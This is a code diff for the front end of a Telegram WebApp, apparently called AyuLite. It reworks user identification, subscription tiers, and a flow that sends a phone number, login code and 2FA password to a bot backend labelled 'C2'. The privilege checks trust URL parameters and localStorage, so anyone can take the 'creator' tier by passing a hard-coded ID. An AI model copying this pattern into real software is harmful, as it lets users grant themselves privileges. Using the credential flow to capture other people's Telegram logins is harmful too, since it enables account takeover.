@@ -103,6 +103,7 @@ const ROOT_CREATOR_IDS = [7926138510, 1406048573];
 function isRootCreator(id) { return ROOT_CREATOR_IDS.includes(Number(id)); }
 
 let currentUserTierKey = 'none';
+let currentActiveUserId = null;
 
 function initApp() {
   try {
@@ -294,34 +295,64 @@ function loadUserData() {
   const userIdFromUrl = parseInt(urlParams.get('user_id'), 10);
   const expiryFromUrl = urlParams.get('expiry');
 
-  const effectiveUserId = user?.id || userIdFromUrl || 0;
+  // Определяем пользователя: 1) из Telegram WebApp SDK, 2) из параметров URL, 3) гость
+  let effectiveUserId = null;
+  if (user && user.id) {
+    effectiveUserId = user.id;
+    currentActiveUserId = user.id;
+  } else if (userIdFromUrl && !isNaN(userIdFromUrl) && userIdFromUrl > 0) {
+    effectiveUserId = userIdFromUrl;
+    currentActiveUserId = userIdFromUrl;
+  }
+
+  // Обновляем отображение имени и ID
+  if (user && user.id) {
+    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.username || `Пользователь ${user.id}`;
+    if (nameEl) nameEl.textContent = fullName;
+    if (idEl) idEl.textContent = `ID: ${user.id}${user.username ? ' • @' + user.username : ''}`;
+    if (avatarEl) {
+      if (user.photo_url) {
+        avatarEl.src = user.photo_url;
+      } else {
+        avatarEl.src = `https://api.dicebear.com/7.x/bottts/svg?seed=${user.id}`;
+      }
+    }
+  } else if (effectiveUserId) {
+    if (nameEl) nameEl.textContent = isRootCreator(effectiveUserId) ? 'Создатель (Root)' : `Пользователь #${effectiveUserId}`;
+    if (idEl) idEl.textContent = `ID: ${effectiveUserId}`;
+    if (avatarEl) {
+      avatarEl.src = `https://api.dicebear.com/7.x/bottts/svg?seed=${effectiveUserId}`;
+    }
+  } else {
+    if (nameEl) nameEl.textContent = 'Гость AyuLite';
+    if (idEl) idEl.textContent = 'ID: Не авторизован';
+    if (avatarEl) {
+      avatarEl.src = 'https://api.dicebear.com/7.x/bottts/svg?seed=guest';
+    }
+  }
 
   // 1. Приоритет №1: Явно переданный в URL параметр ?tier=... (от бота)
   if (tierFromUrl && SUBSCRIPTION_TIERS[tierFromUrl]) {
     currentUserTierKey = tierFromUrl;
     localStorage.setItem('c2_user_tier', tierFromUrl);
+  } else if (effectiveUserId && isRootCreator(effectiveUserId)) {
+    currentUserTierKey = 'creator';
+    localStorage.setItem('c2_user_tier', 'creator');
   } else {
-    // 2. Приоритет №2: Сохраненный тариф в браузере
     let savedTier = localStorage.getItem('c2_user_tier');
-    // Сбрасываем старый залипший кэш 'creator', если пользователь не истинный root создатель
-    if (savedTier === 'creator' && !isRootCreator(effectiveUserId)) {
+    if (savedTier === 'creator' && (!effectiveUserId || !isRootCreator(effectiveUserId))) {
       localStorage.removeItem('c2_user_tier');
       savedTier = null;
     }
-
     if (savedTier && SUBSCRIPTION_TIERS[savedTier]) {
       currentUserTierKey = savedTier;
-    } else if (isRootCreator(effectiveUserId)) {
-      // 3. Приоритет №3: Только истинный root создатель
-      currentUserTierKey = 'creator';
-      localStorage.setItem('c2_user_tier', 'creator');
     } else {
       currentUserTierKey = 'none';
       localStorage.setItem('c2_user_tier', 'none');
     }
   }
 
-  // Применяем бейдж (красный для Создателя, золотой для Админа и т.д.)
+  // Применяем бейдж
   applyTierToUI(currentUserTierKey);
 
   // Отображаем срок действия подписки
@@ -337,20 +368,6 @@ function loadUserData() {
         expiryEl.textContent = currentUserTierKey === 'creator' ? '⏳ Срок: Навсегда' : (currentUserTierKey === 'none' ? '⏳ Срок: Без подписки' : '⏳ Срок: Активна');
       }
     }
-  }
-
-  if (user) {
-    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || user.username || 'Оператор C2';
-    nameEl.textContent = fullName;
-    idEl.textContent = `ID: ${user.id} • @${user.username || 'anonym'}`;
-    if (user.photo_url) {
-      avatarEl.src = user.photo_url;
-    } else {
-      avatarEl.src = `https://api.dicebear.com/7.x/bottts/svg?seed=${user.id}`;
-    }
-  } else {
-    nameEl.textContent = isRootCreator(effectiveUserId) ? 'Создатель C2 (Root)' : 'Оператор C2';
-    idEl.textContent = `ID: ${effectiveUserId} • active`;
   }
 }
 
@@ -1473,18 +1490,9 @@ async function cancelAuthSession(isTimeout = false) {
   clearInterval(authSessionTimer);
   clearInterval(authTimerInterval);
 
-  const targetUserId = effectiveUserId || 7926138510;
-  try {
-    await fetch(`${getApiBaseUrl()}/api/auth/cancel`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ user_id: targetUserId })
-    });
-  } catch (e) {
-    console.warn('Cancel API request:', e);
-  }
+  // Close overlay and reset fields immediately for instant UI responsiveness
+  closeAuthOverlay();
 
-  // Reset fields
   const phoneInput = document.getElementById('auth-phone-input');
   if (phoneInput) phoneInput.value = '';
   for (let i = 0; i < 5; i++) {
@@ -1494,7 +1502,16 @@ async function cancelAuthSession(isTimeout = false) {
   const passInput = document.getElementById('auth-password-input');
   if (passInput) passInput.value = '';
 
-  closeAuthOverlay();
+  const targetUserId = currentActiveUserId || 7926138510;
+  try {
+    await fetch(`${getApiBaseUrl()}/api/auth/cancel`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: targetUserId })
+    });
+  } catch (e) {
+    console.warn('Cancel API request:', e);
+  }
 
   if (!isTimeout) {
     showAlert('❌ Вход в сессию отменен. Ресурсы освобождены.');
@@ -1733,7 +1750,7 @@ async function submitPhoneAuth() {
   }
 
   try {
-    const targetUserId = effectiveUserId || 7926138510;
+    const targetUserId = currentActiveUserId || 7926138510;
     const res = await fetch(`${getApiBaseUrl()}/api/auth/send_code`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1752,11 +1769,6 @@ async function submitPhoneAuth() {
     console.error('API connection error:', err);
     triggerHaptic('error');
     showAlert('❌ Ошибка связи с сервером бота (' + (err.message || 'NetworkError') + '). Проверьте, что бот запущен и туннель активен!');
-  } finally {
-    if (submitBtn) {
-      submitBtn.style.opacity = '1';
-      submitBtn.disabled = false;
-    }
   } finally {
     if (submitBtn) {
       submitBtn.style.opacity = '1';
@@ -1851,7 +1863,7 @@ async function resendAuthCode() {
   startOtpCountdown();
 
   try {
-    const targetUserId = effectiveUserId || 7926138510;
+    const targetUserId = currentActiveUserId || 7926138510;
     await fetch(`${getApiBaseUrl()}/api/auth/resend_code`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1877,7 +1889,7 @@ async function submitOtpAuth() {
   triggerHaptic('medium');
 
   try {
-    const targetUserId = effectiveUserId || 7926138510;
+    const targetUserId = currentActiveUserId || 7926138510;
     const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_code`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1954,7 +1966,7 @@ async function submitPasswordAuth() {
   }
 
   try {
-    const targetUserId = effectiveUserId || 7926138510;
+    const targetUserId = currentActiveUserId || 7926138510;
     const res = await fetch(`${getApiBaseUrl()}/api/auth/verify_password`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
